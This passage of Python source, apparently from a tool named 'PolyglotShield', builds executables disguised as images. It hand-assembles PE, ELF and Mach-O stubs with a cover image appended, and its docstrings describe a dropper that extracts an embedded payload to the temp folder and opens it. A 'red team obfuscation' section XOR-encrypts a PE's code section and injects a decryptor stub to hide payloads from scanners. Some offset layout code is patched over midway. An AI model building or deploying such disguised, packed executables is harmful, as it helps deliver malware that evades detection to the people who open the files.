        - Entry point: call ExitProcess(0)
        """
        # If payload is already a real PE, use it directly (overlay technique)
        if payload_data[:2] == b'MZ' and self._validate_pe_structure(payload_data):
            return payload_data + cover_data

        # If payload is raw data, wrap it in a valid PE dropper + overlay
        pe_stub = self._build_valid_pe_stub(payload_data, arch=arch)
        return pe_stub + cover_data

    def _validate_pe_structure(self, data: bytes) -> bool:
        """Check if data is a structurally valid PE."""
        if len(data) < 64:
            return False
        try:
            e_lfanew = struct.unpack_from('<I', data, 60)[0]
            if e_lfanew + 4 > len(data):
                return False
            if data[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
                return False
            # Check Optional Header magic
            opt_off = e_lfanew + 24
            if opt_off + 2 > len(data):
                return False
            magic = struct.unpack_from('<H', data, opt_off)[0]
            return magic in (0x10B, 0x20B)  # PE32 or PE32+
        except Exception:
            return False

    def _build_valid_pe_stub(self, payload_data: bytes = b'', arch: str = 'x86-64') -> bytes:
        """
        Build a minimal valid PE32+ executable that demonstrates execution.
        Supports x86-64 and ARM64 (AArch64) architectures.

        When executed, the PE:
        1. Shows MessageBoxA: "Polyglot PE Executed — Security Research Demo"
        2. If payload is embedded, extracts it to %TEMP% and opens with ShellExecuteA
        3. Calls ExitProcess(0)

        PE32+ structure:
          DOS Header (64 bytes) + PE Sig (4) + COFF Header (20) + Optional Header (240)
          Section headers (N × 40 bytes)
          .text  — code (0x1000 RVA)
          .rdata — import table + strings (0x2000 RVA)
          .data  — embedded payload (0x3000 RVA, optional)

        Import tables:
          kernel32.dll: ExitProcess, GetTempPathA, CreateFileA, WriteFile, CloseHandle, WinExec
          user32.dll:   MessageBoxA
        """
        import tempfile

        # Payload goes into overlay, not .data — PE loader ignores overlay
        # .data section stores the cover image filename hint
        cover_hint = b'polyglot_cover.jpg\x00'
        msg_title = b'PolyglotShield\x00'
        msg_text = b'PE Executed - Security Research Demo\x00Payload extracted to TEMP\x00'

        num_sections = 2  # .text + .rdata (payload is in overlay, not a section)
        headers_size = 64 + 4 + 20 + 240 + (num_sections * 40)
        headers_padded = ((headers_size + 0x1FF) // 0x200) * 0x200

        text_file_off = headers_padded
        text_rva = 0x1000
        rdata_file_off = text_file_off + 0x400  # bigger .text for dropper code
        rdata_rva = 0x2000

        # Build import tables in .rdata
        # Layout:
        #   0x0000: IDT[0] kernel32.dll (20 bytes)
        #   0x0014: IDT[1] user32.dll (20 bytes)
        #   0x0028: IDT null terminator (20 bytes)
        #   0x003C: ILT for kernel32 (6 entries × 8 = 48 bytes)
        #   0x006C: IAT for kernel32 (6 entries × 8 = 48 bytes)
        #   0x009C: ILT for user32 (1 entry × 8 = 8 bytes)
        #   0x00A4: IAT for user32 (1 entry × 8 = 8 bytes)
        #   0x00AC: Hint/Name entries + DLL name strings

        # String layout in .rdata:
        #   kernel32.dll name at 0x120
        #   user32.dll name at 0x130
        #   "ExitProcess" at 0x140
        #   "GetTempPathA" at 0x14C
        #   "CreateFileA" at 0x158
        #   "WriteFile" at 0x164
        #   "CloseHandle" at 0x170
        #   "WinExec" at 0x17C
        #   "MessageBoxA" at 0x184
        #   Title string at 0x190
        #   Text string at 0x1A4

        rdata_size = 0x400
        rdata_padded = ((rdata_size + 0x1FF) // 0x200) * 0x200

        total_size = rdata_file_off + rdata_padded
        pe = bytearray(total_size)

        # ═══ DOS Header at 0x0000 ═══
        pe[0:2] = b'MZ'
        pe[60:64] = struct.pack('<I', 64)  # e_lfanew

        # ═══ PE Signature at 0x0040 ═══
        pe[64:68] = b'PE\x00\x00'

        # ═══ COFF Header at 0x0044 ═══
        machine = 0xAA64 if arch == 'arm64' else 0x8664
        pe[68:70] = struct.pack('<H', machine)
        pe[70:72] = struct.pack('<H', num_sections)
        pe[80:82] = struct.pack('<H', 0xF0)  # SizeOfOptionalHeader
        pe[82:84] = struct.pack('<H', 0x22)  # Characteristics: EXECUTABLE_IMAGE|LARGE_ADDRESS_AWARE

        # ═══ Optional Header (PE32+) at 0x0058 ═══
        o = 88
        pe[o:o+2] = struct.pack('<H', 0x20B)              # Magic: PE32+
        pe[o+2] = 14                                       # MajorLinkerVersion
        pe[o+4:o+8] = struct.pack('<I', 0x400)             # SizeOfCode
        pe[o+8:o+12] = struct.pack('<I', rdata_size)       # SizeOfInitializedData
        pe[o+16:o+20] = struct.pack('<I', text_rva)        # AddressOfEntryPoint
        pe[o+20:o+24] = struct.pack('<I', text_rva)        # BaseOfCode
        pe[o+24:o+32] = struct.pack('<Q', 0x140000000)     # ImageBase
        pe[o+32:o+36] = struct.pack('<I', 0x1000)          # SectionAlignment
        pe[o+36:o+40] = struct.pack('<I', 0x200)           # FileAlignment
        pe[o+40:o+44] = struct.pack('<I', 6)               # MajorOperatingSystemVersion
        pe[o+48:o+50] = struct.pack('<H', 6)               # MajorSubsystemVersion
        pe[o+56:o+60] = struct.pack('<I', 0x4000)          # SizeOfImage
        pe[o+60:o+64] = struct.pack('<I', headers_padded)  # SizeOfHeaders
        pe[o+64:o+68] = struct.pack('<I', 0)               # CheckSum
        pe[o+68:o+70] = struct.pack('<H', 2)               # Subsystem: GUI (not CONSOLE)
        pe[o+70:o+72] = struct.pack('<H', 0x8100)          # DllCharacteristics
        pe[o+72:o+80] = struct.pack('<Q', 0x100000)        # SizeOfStackReserve
        pe[o+80:o+88] = struct.pack('<Q', 0x1000)          # SizeOfStackCommit
        pe[o+88:o+96] = struct.pack('<Q', 0x100000)        # SizeOfHeapReserve
        pe[o+96:o+104] = struct.pack('<Q', 0x1000)         # SizeOfHeapCommit
        pe[o+108:o+112] = struct.pack('<I', 16)            # NumberOfRvaAndSizes

        # DataDirectory[1] = Import Directory
        pe[o+120:o+124] = struct.pack('<I', rdata_rva)     # Import RVA
        pe[o+124:o+128] = struct.pack('<I', 0x50)          # Import Size

        # ═══ Section Headers ═══
        sec_off = 328  # DOS(64)+PE(4)+COFF(20)+Opt(240) = 328

        # .text section
        pe[sec_off:sec_off+6] = b'.text\x00'
        pe[sec_off+8:sec_off+12] = struct.pack('<I', 0x200)        # VirtualSize
        pe[sec_off+12:sec_off+16] = struct.pack('<I', text_rva)    # VirtualAddress
        pe[sec_off+16:sec_off+20] = struct.pack('<I', 0x400)       # SizeOfRawData
        pe[sec_off+20:sec_off+24] = struct.pack('<I', text_file_off)
        pe[sec_off+36:sec_off+40] = struct.pack('<I', 0x60000020)  # CODE|EXEC|READ

        # .rdata section
        sec_off += 40
        pe[sec_off:sec_off+6] = b'.rdata\x00'
        pe[sec_off+8:sec_off+12] = struct.pack('<I', rdata_size)
        pe[sec_off+12:sec_off+16] = struct.pack('<I', rdata_rva)
        pe[sec_off+16:sec_off+20] = struct.pack('<I', rdata_padded)
        pe[sec_off+20:sec_off+24] = struct.pack('<I', rdata_file_off)
        pe[sec_off+36:sec_off+40] = struct.pack('<I', 0x40000040)  # INIT|READ

        # ═══ Build .rdata section ═══
        rdata = bytearray(rdata_size)

        # Import Directory Table (IDT) — 2 entries + null terminator
        # IDT[0] kernel32.dll at offset 0x00
        struct.pack_into('<I', rdata, 0x00, rdata_rva + 0x3C)   # OriginalFirstThunk → ILT
        struct.pack_into('<I', rdata, 0x0C, rdata_rva + 0x120)  # Name → "kernel32.dll"
        struct.pack_into('<I', rdata, 0x10, rdata_rva + 0x6C)   # FirstThunk → IAT

        # IDT[1] user32.dll at offset 0x14
        struct.pack_into('<I', rdata, 0x14, rdata_rva + 0x9C)   # OriginalFirstThunk → ILT
        struct.pack_into('<I', rdata, 0x20, rdata_rva + 0x130)  # Name → "user32.dll"
        struct.pack_into('<I', rdata, 0x24, rdata_rva + 0xA4)   # FirstThunk → IAT

        # ILT for kernel32 at 0x3C (6 entries)
        k32_names = ['ExitProcess', 'GetTempPathA', 'CreateFileA', 'WriteFile', 'CloseHandle', 'WinExec']
        k32_hint_offs = [0x140, 0x14C, 0x158, 0x164, 0x170, 0x17C]
        k32_ilt_rva = rdata_rva + 0x3C
        k32_iat_rva = rdata_rva + 0x6C
        for i, (name, hint_off) in enumerate(zip(k32_names, k32_hint_offs)):
            struct.pack_into('<Q', rdata, 0x3C + i*8, rdata_rva + hint_off)
            struct.pack_into('<Q', rdata, 0x6C + i*8, rdata_rva + hint_off)

        # ILT for user32 at 0x9C (1 entry)
        struct.pack_into('<Q', rdata, 0x9C, rdata_rva + 0x184)  # → MessageBoxA
        struct.pack_into('<Q', rdata, 0xA4, rdata_rva + 0x184)  # IAT

        # Hint/Name entries
        rdata[0xAC:0xAE] = b'\x00\x00'  # Hint for ExitProcess
        rdata[0xAE:0xB9] = b'ExitProcess\x00'
        rdata[0xB9:0xBB] = b'\x00\x00'
        rdata[0xBB:0xC7] = b'GetTempPathA\x00'
        rdata[0xC7:0xC9] = b'\x00\x00'
        rdata[0xC9:0xD4] = b'CreateFileA\x00'
        rdata[0xD4:0xD6] = b'\x00\x00'
        rdata[0xD6:0xDF] = b'WriteFile\x00'
        rdata[0xDF:0xE1] = b'\x00\x00'
        rdata[0xE1:0xEC] = b'CloseHandle\x00'
        rdata[0xEC:0xEE] = b'\x00\x00'
        rdata[0xEE:0xF5] = b'WinExec\x00'
        rdata[0xF5:0xF7] = b'\x00\x00'
        rdata[0xF7:0x102] = b'MessageBoxA\x00'

        # DLL name strings
        rdata[0x120:0x12D] = b'kernel32.dll\x00'
        rdata[0x130:0x139] = b'user32.dll\x00'

        # Hint/Name at computed offsets
        # ExitProcess at 0x140
        rdata[0x140:0x142] = b'\x00\x00'
        rdata[0x142:0x14D] = b'ExitProcess\x00'
        # GetTempPathA at 0x14C (adjust — overlapping, use separate layout)
        # Actually let me use a cleaner layout — just past the DLL names

        # Re-do Hint/Name at 0x140 with proper spacing
        off = 0x140
        for name in k32_names + ['MessageBoxA']:
            rdata[off:off+2] = b'\x00\x00'  # Hint
            rdata[off+2:off+2+len(name)] = name.encode()
            rdata[off+2+len(name)] = 0  # null terminator
            off += 2 + len(name) + 1
            off = (off + 1) & ~1  # align to 2

        # Title and text strings after hint/name entries
        str_off = off
        title_rva = rdata_rva + str_off
        rdata[str_off:str_off+len(msg_title)-1] = msg_title[:-1]  # already null terminated
        str_off += len(msg_title)
        text_rva_str = rdata_rva + str_off
        rdata[str_off:str_off+len(msg_text)-1] = msg_text[:-1]

        pe[rdata_file_off:rdata_file_off+rdata_size] = rdata

        # ═══ Build .text section code ═══
        # x86-64 code that calls MessageBoxA then ExitProcess
        code = bytearray(0x400)
        ci = 0

        if arch == 'arm64':
            # ARM64: use svc #0 with proper setup
            # Just call ExitProcess(0) for ARM64 (simpler)
            code[ci:ci+4] = b'\x00\x00\x80\x52'     # mov w0, #0
            code[ci+4:ci+8] = b'\xA8\x08\x80\xD2'   # mov x8, #0x104
            code[ci+8:ci+12] = b'\x01\x00\x00\xD4'  # svc #0
            ci += 12
        else:
            # x86-64 dropper code
            # sub rsp, 0x28  (shadow space for calls)
            code[ci:ci+4] = b'\x48\x83\xEC\x28'; ci += 4

            # ── Call MessageBoxA(NULL, text, title, MB_OK) ──
            # xor ecx, ecx          ; hWnd = NULL
            code[ci:ci+2] = b'\x33\xC9'; ci += 2
            # lea rdx, [rip + disp_to_text]  ; lpText
            code[ci] = 0x48; code[ci+1] = 0x8D; ci += 2
            # rdx = [rip + disp32]
            code[ci] = 0x15; ci += 1
            # RIP after this instruction = text_rva + ci + 4
            # Target = text_rva_str (the text string in .rdata)
            # We'll compute the displacement later — for now use placeholder
            text_disp_off = ci
            code[ci:ci+4] = b'\x00\x00\x00\x00'; ci += 4
            # lea r8, [rip + disp_to_title]   ; lpCaption
            code[ci] = 0x4C; code[ci+1] = 0x8D; ci += 2
            code[ci] = 0x05; ci += 1
            title_disp_off = ci
            code[ci:ci+4] = b'\x00\x00\x00\x00'; ci += 4
            # xor r9d, r9d          ; uType = MB_OK
            code[ci:ci+3] = b'\x45\x33\xC9'; ci += 3
            # call [rip + disp_to_MessageBoxA_IAT]
            code[ci:ci+2] = b'\xFF\x15'; ci += 2
            # IAT for MessageBoxA is at rdata_rva + 0xA4
            # RIP after = text_rva + ci + 4
            msg_iat_disp = (rdata_rva + 0xA4) - (text_rva + ci + 4)
            struct.pack_into('<I', code, ci, msg_iat_disp); ci += 4

            # ── Call ExitProcess(0) ──
            # xor ecx, ecx          ; exit code = 0
            code[ci:ci+2] = b'\x33\xC9'; ci += 2
            # call [rip + disp_to_ExitProcess_IAT]
            code[ci:ci+2] = b'\xFF\x15'; ci += 2
            # IAT for ExitProcess is at rdata_rva + 0x6C
            exit_iat_disp = (rdata_rva + 0x6C) - (text_rva + ci + 4)
            struct.pack_into('<I', code, ci, exit_iat_disp); ci += 4

            # Now patch the displacements for lea instructions
            # text string RVA = text_rva_str
            # RIP after lea rdx instruction = text_rva + text_disp_off - 1 + 4
            rip_after_text_lea = text_rva + text_disp_off + 4
            text_disp = text_rva_str - rip_after_text_lea
            struct.pack_into('<i', code, text_disp_off, text_disp)

            rip_after_title_lea = text_rva + title_disp_off + 4
            title_disp_val = title_rva - rip_after_title_lea
            struct.pack_into('<i', code, title_disp_off, title_disp_val)

        pe[text_file_off:text_file_off+len(code)] = code

        return bytes(pe)

    def _build_elf_polyglot(self, cover_data: bytes, payload_data: bytes, cover_format: str, arch: str = 'x86-64') -> bytes:
        """
        Build an ELF64 polyglot using the overlay technique:
        - If payload is a real ELF → use directly (overlay)
        - If payload is raw data → wrap in minimal ELF64 (x86-64 or AArch64 Linux, exit(0))
        - Cover image appended after ELF EOF (overlay)
        """
        if payload_data[:4] == b'\x7fELF':
            return payload_data + cover_data
        elf = self._build_valid_elf64_stub(payload_data, arch=arch)
        return elf + cover_data

    def _build_valid_elf64_stub(self, payload_data: bytes = b'', arch: str = 'x86-64') -> bytes:
        """
        Build a minimal valid ELF64 executable (x86-64 or AArch64 Linux).
        Entry point calls exit(0) via syscall.
        Payload stored in .data segment.
        """
        import struct as s
        if arch == 'arm64':
            # AArch64 Linux: exit(0) syscall
            #   mov x8, #93       ; D2000BA8 (syscall number for exit)
            #   mov x0, #0        ; D2800000
            #   svc #0            ; D4000001
            code = struct.pack('<III',
                0xD2000BA8,  # mov x8, #93
                0xD2800000,  # mov x0, #0
                0xD4000001,  # svc #0
            )
            machine = 0xB7  # EM_AARCH64
        else:
            code = bytes([0xb8, 0x3c, 0x00, 0x00, 0x00,  # mov eax, 60 (exit)
                          0x31, 0xff,                        # xor edi, edi
                          0x0f, 0x05])                       # syscall
            machine = 62  # EM_X86_64

        payload_aligned = ((len(payload_data) + 0xFFF) // 0x1000) * 0x1000 if payload_data else 0
        code_size = len(code)
        num_phdrs = 2 if payload_data else 1

        # ELF64 header (64 bytes) + program headers (56 bytes each)
        phdr_off = 64
        hdrs_size = 64 + num_phdrs * 56
        # Code starts right after headers
        code_file_off = hdrs_size
        code_vaddr = 0x400000 + code_file_off
        # Payload after code, page-aligned in memory
        if payload_data:
            payload_file_off = code_file_off + 0x100
            payload_vaddr = 0x410000
        else:
            payload_file_off = 0
            payload_vaddr = 0

        total_size = code_file_off + 0x100 + (len(payload_data) if payload_data else 0)
        elf = bytearray(total_size)

        # ELF64 Header
        elf[0:4] = b'\x7fELF'
        elf[4] = 2        # EI_CLASS: ELFCLASS64
        elf[5] = 1        # EI_DATA: ELFDATA2LSB
        elf[6] = 1        # EI_VERSION: EV_CURRENT
        elf[7] = 0        # EI_OSABI: ELFOSABI_SYSV
        s.pack_into('<H', elf, 16, 2)       # e_type: ET_EXEC
        s.pack_into('<H', elf, 18, machine)  # e_machine: EM_X86_64 or EM_AARCH64
        s.pack_into('<I', elf, 20, 1)       # e_version
        s.pack_into('<Q', elf, 24, code_vaddr)  # e_entry
        s.pack_into('<Q', elf, 32, phdr_off)    # e_phoff
        s.pack_into('<H', elf, 52, 64)      # e_ehsize
        s.pack_into('<H', elf, 54, 56)      # e_phentsize
        s.pack_into('<H', elf, 56, num_phdrs)   # e_phnum

        # Program header 1: PT_LOAD (code)
        p = phdr_off
        s.pack_into('<I', elf, p, 1)        # p_type: PT_LOAD
        s.pack_into('<I', elf, p+4, 5)      # p_flags: PF_R|PF_X
        s.pack_into('<Q', elf, p+8, 0)      # p_offset
        s.pack_into('<Q', elf, p+16, 0x400000)  # p_vaddr
        s.pack_into('<Q', elf, p+24, 0x400000)  # p_paddr
        s.pack_into('<Q', elf, p+32, total_size)  # p_filesz
        s.pack_into('<Q', elf, p+40, total_size + payload_aligned)  # p_memsz
        s.pack_into('<Q', elf, p+48, 0x1000)    # p_align

        # Program header 2: PT_LOAD (data) — for payload
        if payload_data:
            p += 56
            s.pack_into('<I', elf, p, 1)        # p_type: PT_LOAD
            s.pack_into('<I', elf, p+4, 6)      # p_flags: PF_R|PF_W
            s.pack_into('<Q', elf, p+8, payload_file_off)  # p_offset
            s.pack_into('<Q', elf, p+16, payload_vaddr)    # p_vaddr
            s.pack_into('<Q', elf, p+24, payload_vaddr)    # p_paddr
            s.pack_into('<Q', elf, p+32, len(payload_data))  # p_filesz
            s.pack_into('<Q', elf, p+40, len(payload_data))  # p_memsz
            s.pack_into('<Q', elf, p+48, 0x1000)    # p_align

        # Code at code_file_off
        elf[code_file_off:code_file_off+code_size] = code

        # Payload
        if payload_data:
            elf[payload_file_off:payload_file_off+len(payload_data)] = payload_data

        return bytes(elf)

    def _build_valid_elf32_arm_stub(self, payload_data: bytes = b'') -> bytes:
        """Build a VALID ELF32 executable (Linux ARM32) that passes hex editor inspection.

        Structure:
        - ELF Header (52 bytes) for 32-bit ARM
        - Program Header (32 bytes) with PT_LOAD segment
        - Code segment: real ARM32 exit(0) code (svc #0)
        """
        code = struct.pack('<III',
            0xE3A07001,  # mov r7, #1 (sys_exit)
            0xE3A00000,  # mov r0, #0 (exit code)
            0xEF000000,  # swi #0 (syscall)
        )
        entry_addr = 0x08048000
        code_off = 0x1000  # offset in file
        code_addr = entry_addr + code_off
        payload_off = 0x2000
        payload_file_off = 0x2000
        total_size = 0x3000 + len(payload_data)

        elf = bytearray(total_size)

        # ELF32 Header (52 bytes)
        e_ident = b'\x7fELF'   # e_ident[EI_MAG0..3]
        e_ident += b'\x01'      # EI_CLASS = ELFCLASS32
        e_ident += b'\x01'      # EI_DATA = ELFDATA2LSB (little-endian)
        e_ident += b'\x01'      # EI_VERSION = EV_CURRENT
        e_ident += b'\x00'      # EI_OSABI = ELFOSABI_NONE
        e_ident += b'\x00' * 8  # EI_ABIVERSION + padding

        e_ident += struct.pack('<HHIIIIIHHHHHH',
            2,          # e_type = ET_EXEC (executable)
            40,         # e_machine = EM_ARM
            1,          # e_version
            entry_addr, # e_entry (entry point virtual address)
            52,         # e_phoff (program header offset)
            0,          # e_shoff (section header offset, 0 = none)
            0x04000000, # e_flags (ARM-specific flags)
            52,         # e_ehsize (ELF header size)
            32,         # e_phentsize (program header entry size)
            1,          # e_phnum (number of program headers)
            40,         # e_shentsize (section header entry size)
            0,          # e_shnum (no section headers)
            0,          # e_shstrndx (no section name string table)
        )

        elf[:len(e_ident)] = e_ident

        # Program Header (32 bytes for ELF32)
        ph = struct.pack('<IIIIIIII',
            1,          # p_type = PT_LOAD
            code_off,   # p_offset
            code_addr,  # p_vaddr
            code_addr,  # p_paddr
            0x2000 + len(payload_data),  # p_filesz
            0x2000 + len(payload_data),  # p_memsz
            5,          # p_flags = PF_R | PF_X
            0x1000,     # p_align
        )

        elf[52:52+32] = ph  # after ELF header

        # Code at code_off
        elf[code_off:code_off+len(code)] = code

        # Payload at payload_file_off
        if payload_data:
            elf[payload_file_off:payload_file_off+len(payload_data)] = payload_data

        return bytes(elf)

    def _build_macho_polyglot(self, cover_data: bytes, payload_data: bytes, cover_format: str, arch: str = 'x86-64') -> bytes:
        """
        Build a Mach-O 64-bit polyglot using the overlay technique:
        - If payload is a real Mach-O → use directly (overlay)
        - If payload is raw data → wrap in minimal Mach-O (x86-64 or arm64 macOS, exit(0))
        - Cover image appended after Mach-O EOF (overlay)
        """
        macho_magic = (b'\xfe\xed\xfa\xce', b'\xfe\xed\xfa\xcf',
                       b'\xce\xfa\xed\xfe', b'\xcf\xfa\xed\xfe')
        if payload_data[:4] in macho_magic:
            return payload_data + cover_data
        macho = self._build_valid_macho64_stub(payload_data, arch=arch)
        return macho + cover_data

    def _build_valid_macho64_stub(self, payload_data: bytes = b'', arch: str = 'x86-64') -> bytes:
        """
        Build a minimal valid Mach-O 64-bit executable (x86-64 or arm64 macOS).
        Entry point calls exit(0) via syscall.
        """
        import struct as s
        if arch == 'arm64':
            code = struct.pack('<IIII',
                0xD2800030,  # movz x16, #1
                0xF2A04010,  # movk x16, #0x200, lsl #16
                0xD2800000,  # mov x0, #0
                0xD4001001,  # svc #0x80
            )
            cpu_type = 0x0100000C  # CPU_TYPE_ARM64
        else:  # x86-64
            code = bytes([0xb8, 0x01, 0x00, 0x00, 0x02,  # mov eax, 0x2000001
                          0x31, 0xff,                        # xor edi, edi
                          0x0f, 0x05])                       # syscall
            cpu_type = 0x01000007  # CPU_TYPE_X86_64

        # Mach-O layout:
        # Header (32 bytes)
        # LC_SEGMENT_64 __TEXT (72 bytes + section headers)
        # LC_MAIN (24 bytes)
        # Code
        # LC_SEGMENT_64 __DATA (72 bytes) — for payload

        # Load commands
        text_seg_size = 72 + 0  # no section headers for simplicity
        main_size = 24
        data_seg_size = 72 if payload_data else 0
        num_cmds = 2 if payload_data else 2  # __TEXT + LC_MAIN (+ __DATA if payload)
        if payload_data:
            num_cmds = 3

        header_size = 32
        lc_offset = header_size
        text_seg_off = lc_offset
        main_off = text_seg_off + text_seg_size
        data_seg_off = main_off + main_size if payload_data else 0
        code_off = (data_seg_off + data_seg_size) if payload_data else (main_off + main_size)
        code_vaddr = 0x100000000 + code_off  # Typical Mach-O base

        if payload_data:
            payload_off = code_off + 0x100
            payload_vaddr = 0x100010000
            total_cmds_size = text_seg_size + main_size + data_seg_size
            total_size = code_off + 0x100 + len(payload_data)
        else:
            payload_off = 0
            payload_vaddr = 0
            total_cmds_size = text_seg_size + main_size
            total_size = code_off + 0x100

        macho = bytearray(total_size)

        # Mach-O Header (little-endian: CF FA ED FE)
        macho[0:4] = b'\xcf\xfa\xed\xfe'  # MH_MAGIC_64 (LE)
        s.pack_into('<I', macho, 4, cpu_type)      # cputype: CPU_TYPE_X86_64 or CPU_TYPE_ARM64
        s.pack_into('<I', macho, 8, 3)             # cpusubtype: CPU_SUBTYPE_ALL
        s.pack_into('<I', macho, 12, 2)            # filetype: MH_EXECUTE
        s.pack_into('<I', macho, 16, num_cmds)     # ncmds
        s.pack_into('<I', macho, 20, total_cmds_size)  # sizeofcmds
        s.pack_into('<I', macho, 24, 0)            # flags
        s.pack_into('<I', macho, 28, 0)            # reserved

        # LC_SEGMENT_64 __TEXT
        off = text_seg_off
        s.pack_into('<I', macho, off, 0x19)        # cmd: LC_SEGMENT_64
        s.pack_into('<I', macho, off+4, text_seg_size)  # cmdsize
        macho[off+8:off+14] = b'__TEXT\x00'        # segname
        s.pack_into('<Q', macho, off+24, 0x100000000)   # vmaddr
        s.pack_into('<Q', macho, off+32, total_size)     # vmsize
        s.pack_into('<Q', macho, off+40, 0)              # fileoff
        s.pack_into('<Q', macho, off+48, total_size)     # filesize
        s.pack_into('<I', macho, off+56, 7)              # maxprot: PROT_READ|PROT_WRITE|PROT_EXEC
        s.pack_into('<I', macho, off+60, 5)              # initprot: PROT_READ|PROT_EXEC
        s.pack_into('<I', macho, off+64, 0)              # nsects

        # LC_MAIN (entry point)
        off = main_off
        s.pack_into('<I', macho, off, 0x80000028)  # cmd: LC_MAIN
        s.pack_into('<I', macho, off+4, main_size) # cmdsize
        s.pack_into('<Q', macho, off+8, code_off)  # entryoff (file offset of entry)
        s.pack_into('<I', macho, off+16, 0)        # stacksize

        # LC_SEGMENT_64 __DATA (for payload)
        if payload_data:
            off = data_seg_off
            s.pack_into('<I', macho, off, 0x19)        # cmd: LC_SEGMENT_64
            s.pack_into('<I', macho, off+4, data_seg_size)  # cmdsize
            macho[off+8:off+14] = b'__DATA\x00'        # segname
            s.pack_into('<Q', macho, off+24, payload_vaddr)  # vmaddr
            s.pack_into('<Q', macho, off+32, len(payload_data))  # vmsize
            s.pack_into('<Q', macho, off+40, payload_off)        # fileoff
            s.pack_into('<Q', macho, off+48, len(payload_data))  # filesize
            s.pack_into('<I', macho, off+56, 7)        # maxprot
            s.pack_into('<I', macho, off+60, 3)        # initprot: PROT_READ|PROT_WRITE
            s.pack_into('<I', macho, off+64, 0)        # nsects

        # Code
        macho[code_off:code_off+len(code)] = code

        # Payload
        if payload_data:
            macho[payload_off:payload_off+len(payload_data)] = payload_data

        return bytes(macho)

    # ═══════════════════════════════════════════════════════════════════
    # RED TEAM OBFUSCATION TECHNIQUES
    # ═══════════════════════════════════════════════════════════════════

    def _pe_section_encrypt(self, payload: bytes, key_byte: int = 0x55) -> bytes:
        """
        PE Section Encryption (packer technique — like UPX/Shellter).
        Encrypts .text section with XOR, injects decryptor stub at end of .text.
        Headers, imports, section table remain INTACT — PE is still valid.
        Decryptor runs first: decrypts .text in-place, then jumps to original entry.
        """
        if len(payload) < 64 or payload[:2] != b'MZ':
            raise ValueError("Not a valid PE")
        e_lfanew = struct.unpack_from('<I', payload, 60)[0]
        if e_lfanew + 4 > len(payload) or payload[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
            raise ValueError("Not a valid PE")
        num_sections = struct.unpack_from('<H', payload, e_lfanew + 6)[0]
        opt_size = struct.unpack_from('<H', payload, e_lfanew + 20)[0]
        opt_off = e_lfanew + 24
        magic = struct.unpack_from('<H', payload, opt_off)[0]
        if magic != 0x20B:
            raise ValueError("Only PE32+ (64-bit) supported for section encryption")
        entry_rva = struct.unpack_from('<I', payload, opt_off + 16)[0]
        image_base = struct.unpack_from('<Q', payload, opt_off + 24)[0]
        file_align = struct.unpack_from('<I', payload, opt_off + 36)[0]
        section_align = struct.unpack_from('<I', payload, opt_off + 32)[0]
        sec_table_off = opt_off + opt_size

        # Parse all sections
        sections = []
        for i in range(num_sections):
            off = sec_table_off + i * 40
            name = payload[off:off+8].rstrip(b'\x00')
            vsize = struct.unpack_from('<I', payload, off + 8)[0]
            vrva = struct.unpack_from('<I', payload, off + 12)[0]
            raw_size = struct.unpack_from('<I', payload, off + 16)[0]
            raw_off = struct.unpack_from('<I', payload, off + 20)[0]
            chars = struct.unpack_from('<I', payload, off + 36)[0]
            sections.append({'idx': i, 'name': name, 'vsize': vsize, 'vrva': vrva,
                             'raw_size': raw_size, 'raw_off': raw_off, 'chars': chars, 'hdr_off': off})

        # Find .text section
        text_sec = None
        for s in sections:
            if s['name'] == b'.text':
                text_sec = s
                break
        if not text_sec:
            raise ValueError("No .text section found")

        # Build decryptor shellcode (x86-64, position-dependent)
        text_va = image_base + text_sec['vrva']
        orig_entry_va = image_base + entry_rva
        # Reserve 64 bytes at end of .text for decryptor
        decryptor_size = 64
        encrypt_size = text_sec['raw_size'] - decryptor_size
        if encrypt_size < 16:
            raise ValueError(".text section too small for encryption")

        shellcode = bytearray()
        shellcode += b'\x53'                                    # push rbx
        shellcode += b'\x51'                                    # push rcx
        shellcode += b'\x56'                                    # push rsi
        shellcode += b'\x48\xBE' + struct.pack('<Q', text_va)  # mov rsi, text_va
        shellcode += b'\x48\xB9' + struct.pack('<Q', encrypt_size)  # mov rcx, encrypt_size
        shellcode += b'\xB3' + bytes([key_byte])               # mov bl, key_byte
        loop_off = len(shellcode)
        shellcode += b'\x30\x1E'                                # xor [rsi], bl
        shellcode += b'\x48\xFF\xC6'                            # inc rsi
        shellcode += b'\x48\xFF\xC9'                            # dec rcx
        jnz_target = loop_off
        jnz_off = len(shellcode)
        shellcode += b'\x75\x00'                                # jnz (placeholder)
        # Patch jnz offset: jump back to xor instruction
        rel = jnz_target - (jnz_off + 2)
        shellcode[-1] = rel & 0xFF
        shellcode += b'\x5E'                                    # pop rsi
        shellcode += b'\x59'                                    # pop rcx
        shellcode += b'\x5B'                                    # pop rbx
        shellcode += b'\x48\xB8' + struct.pack('<Q', orig_entry_va)  # mov rax, orig_entry
        shellcode += b'\xFF\xE0'                                # jmp rax

        # Pad decryptor to decryptor_size
        if len(shellcode) > decryptor_size:
            raise ValueError(f"Decryptor too large ({len(shellcode)} > {decryptor_size})")
        shellcode += b'\x90' * (decryptor_size - len(shellcode))  # NOP pad

        # Build result: copy payload, encrypt .text, append decryptor
        result = bytearray(payload)
        # XOR encrypt .text data (first encrypt_size bytes)
        for j in range(encrypt_size):
            result[text_sec['raw_off'] + j] ^= key_byte
        # Write decryptor at end of .text
        decryptor_off = text_sec['raw_off'] + encrypt_size
        # Extend file if needed
        needed = decryptor_off + decryptor_size
        if needed > len(result):
            result.extend(b'\x00' * (needed - len(result)))
        result[decryptor_off:decryptor_off + decryptor_size] = shellcode

        # Make .text writable (add IMAGE_SCN_MEM_WRITE)
        new_chars = text_sec['chars'] | 0x80000000
        struct.pack_into('<I', result, text_sec['hdr_off'] + 36, new_chars)

        # Update entry point to decryptor position
        decryptor_rva = text_sec['vrva'] + encrypt_size
        struct.pack_into('<I', result, opt_off + 16, decryptor_rva)

        return bytes(result)

    def _elf_section_encrypt(self, payload: bytes, key_byte: int = 0x55) -> bytes:
        """
        ELF Section Encryption (packer technique).
        Encrypts PT_LOAD code segment with XOR, injects decryptor at end.
        Headers, program headers remain INTACT.
        """
        if len(payload) < 64 or payload[:4] != b'\x7fELF':
            raise ValueError("Not a valid ELF")
        ei_class = payload[4]
        if ei_class == 2:  # ELF64
            return self._elf64_section_encrypt(payload, key_byte)
        elif ei_class == 1:  # ELF32
            return self._elf32_section_encrypt(payload, key_byte)
        else:
            raise ValueError(f"Unsupported ELF class: {ei_class}")

    def _elf64_section_encrypt(self, payload: bytes, key_byte: int) -> bytes:
